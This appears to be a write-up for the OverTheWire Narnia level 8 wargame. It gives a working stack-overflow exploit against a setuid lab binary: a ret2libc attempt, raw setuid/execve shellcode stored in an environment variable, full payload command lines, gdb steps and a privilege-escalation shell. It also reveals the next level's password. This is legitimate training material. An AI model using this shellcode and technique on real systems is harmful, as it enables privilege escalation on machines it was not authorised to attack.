# Overview
We get the following C code:
```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;

void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;

	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];

	printf("%s\n",bok);
}

int main(int argc, char **argv){

	if(argc > 1)
		func(argv[1]);
	else
	printf("%s argument\n", argv[0]);

	return 0;
}
```

You can quickly see that the for loop in `func()` may write data past the end of `bok`, so we passing an argument longer than 20 bytes we can cause a stack-based buffer overflow. 

# Overflowing blah
Here is the stack layout in `func()`:
```
          +--------------------------+
  esp --> |            bok           |
          |                          |
          |                          |
          |                          |
          |                          |
          +--------------------------+
          |           blah           |--\
          +--------------------------+  |
  esp --> |         saved ebp        |  |
          +--------------------------+  |
          |       return address     |  |
          +--------------------------+  |
          |           ...            |  |
          +--------------------------+ ...
```

The main problem here is we need to overflow `bok` all the way to the return address, however bytes are read from the `blah` pointer. If after overflowing `bok` we overflow `blah` with random bytes, we won't be able to read the remaining bytes. So we need to overflow `blah` with itself. First step, how do we get that value?

Run the following command:
```
$ /narnia/narnia8 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAA')") | xxd
00000000: 4141 4141 0a                             AAAA.
```

Here `bok` contains 4 'A' characters followed by null bytes, so `printf()` only prints out the 4 characters. Now run the following command:
```
$ /narnia/narnia8 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAA')") | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 fad4 ffff a8d2 ffff 0192 0408  AAAA............
00000020: fad4 ffff 0a                             .....
```

Here `bok` is completely overflowed with 'A' characters. There are no more null bytes, so `printf()` just reading bytes until it finds a null byte. That gives us the address in `blah`. However a couple notes:
- `blah` points at `argv[1]`. For some reason the address of `argv[1]` depends on its size. It looks like the address of the end of the string is fixed, so the longer the string then lower will be the address of the start of the string.
- Furthermore, it seems that address of `argv[1]` varies by a few bytes across executions, I am not sure why.

You can also check it by running the binary via gdb. First create a directory (`cd $(mktemp -d)`), then create a command file:
```
set disassembly-flavor intel
source /opt/gef/gdbinit.py
gef config context.nb_lines_stack 40
break *func+77
run
```

Then run the binary with inputs of various sizes:
```
gdb --command=cmds --args /narnia/narnia8 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAA')")
gdb --command=cmds --args /narnia/narnia8 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAAA')")
```

When running the binary with argument 'AAAA', the address pointed to by `blah` is 0xffffd4dd. However, when running it with the argument 'AAAAA', the address pointed to by `blah` is 0xffffd4dc. So take that into account when building a payload!

# ret2libc
First observation, `bok` is too short for a shellcode. I tried another way, ret2libc. The idea is to replace the return address with the address of a function from libc, namely `system()`, and prepare a minimal stack frame with a pointer to the string to be executed by `system()`. There are further information here: https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc.

We can overwrite `bok` to obtain the following stack layout:
```
          +--------------------------+
  esp --> |            bok           |
          |                          |
          |                          |
          |                          |
          |                          |
          +--------------------------+
          |           blah           |--\
          +--------------------------+  |
  esp --> |      (random bytes)      |  |
          +--------------------------+  |
          |     system() address     |  |
          +--------------------------+  |
          |      (random bytes)      |  |
          +--------------------------+  |
          |    ptr to system() arg   |--|--------> ...
          +--------------------------+ ...
```

So the payload should look something like this:
```
/narnia/narnia8 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAA<4 bytes blah>BBBB<system() address>CCCC<ptr to system() argument>')")
```

Now the next question is, how to find those two addresses? Regarding `system()`, you can create a small C program:
```c
#include <stdlib.h>

int main(int argc, char **argv) {
    system("id");
}
```

Then run it within gdb, step in the call to `system()` and you should end in the `system()` PLT stub:
```
=> 0x56556040 <+0>:	jmp    DWORD PTR [ebx+0x10]
   0x56556046 <+6>:	push   0x8
   0x5655604b <+11>:	jmp    0x56556020
```

Check the address in `ebx+0x10`, that should be the address of `system()`. Great! Now what about its argument? The blog post above looks for the string `/bin/sh` in libc, and finds its address. First you run this command:
```
$ strings -a -t x /usr/lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 1c4de8 /bin/sh
```

That's the offset to the string within the libc binary. Then run `info proc map` within gdb to get the base address of libc, add the two and you get the address of the string. The final payload looks like:
```
/narnia/narnia8 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAA\xcb\xd4\xff\xffBBBB\x30\xd4\xdc\xf7CCCC\xe8\x1d\xf4\xf7')")
```

Of course, all of the above works because we disabled ASLR. But also, the binary is setuid and child shell resets the effective UID. We end up with a shell as narnia8, not good. We could try to chain calls to `setuid()` and `system()`, something like:
```
gdb --command=cmds --args /narnia/narnia8 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAA\xb7\xd4\xff\xffBBBB\xd0\xff\xe7\xf7\x30\xd4\xdc\xf7\xb9\x36\x00\x00\xe8\x1d\xf4\xf7')")
```

However, our payload includes null bytes and those are stripped when passed to the binary. So plan B!

## Passing a shellcode in an environment variable
Plan B is based on https://axcheron.github.io/writeups/otw/narnia/ and https://medium.com/@mounisha.makineni12/return-to-libc-attack-exploiting-buffer-overflow-for-privilege-escalation-105fea0fe9a2. Instead of using ret2libc, the idea here is to set an environment variable with a shellcode, then jump to it.

First let's set the environment variable (the shellcode is the one from narnia1, with the user id updated):
```sh
export SHELLCODE=$(printf "\x31\xC0\x31\xDB\x31\xC9\x66\xB9\xB9\x36\x66\xBB\xB9\x36\xB0\x46\xCD\x80\x31\xDB\x31\xC9\x99\x6A\x0B\x58\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x51\x89\xE2\x53\x89\xE1\xCD\x80")
```

To know its address, use the following C program:
```c
#include <stdio.h>
#include <stdlib.h>

void main() {
  char* shell = getenv("SHELLCODE");
  if (shell)
    printf("%x\n", (unsigned int)shell);
}
```

Compile it and run it:
```sh
$ gcc -m32 -o myenv myenv.c
$ ./myenv
ffffd4e5
```

**Fun fact**, the address of the environment variable depends on the size of argv[0]. If I invoke the program using a string as long as `/narnia/narnia8`:
```sh
$ ./////////myenv
ffffd4d5
```
Let's apply it to `/narnia/narnia8`. First run the binary with 20 A's as the first argument:
```sh
$ /narnia/narnia8 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAA')") | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 96d4 ffff 38d2 ffff 0192 0408  AAAA....8.......
00000020: 96d4 ffff 0a
```
So the address pointed by `blah` is 0xffffd496. Now let's use the full payload (and substract 12 to account for the longer payload):
```sh
$ /narnia/narnia8 $(python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAA\x8a\xd4\xff\xffBBBB\xd5\xd4\xff\xff')")
AAAAAAAAAAAAAAAAAAAA����BBBB��������
$ id
uid=14009(narnia9) gid=14008(narnia8) groups=14008(narnia8)
```

BOOM!

# The end
Password for the next level is `1FFD4HnU4K`.
